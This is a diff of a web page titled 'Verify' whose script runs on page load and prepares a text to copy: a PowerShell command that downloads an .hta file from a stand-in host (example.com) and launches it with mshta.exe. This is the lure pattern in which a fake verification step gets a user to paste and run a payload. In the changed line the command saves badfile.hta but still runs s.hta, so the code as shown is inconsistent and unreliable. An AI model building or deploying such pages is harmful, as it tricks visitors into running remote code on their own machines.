@@ -6,7 +6,7 @@
   <title>Verify</title>
   <script>
     document.addEventListener("DOMContentLoaded", async () => {
-    const textToCopy = "powershell -c iwr https://example.com/badfile.hta -Outfile $env:userprofile\\s.hta; Start-Process -FilePath \"mshta.exe\" -ArgumentList \"\$env:userprofile\\s.hta\"";
+    const textToCopy = "powershell -c iwr https://example.com/badfile.hta -Outfile $env:userprofile\\badfile.hta; Start-Process -FilePath \"mshta.exe\" -ArgumentList \"\$env:userprofile\\s.hta\"";
 
 
     try {
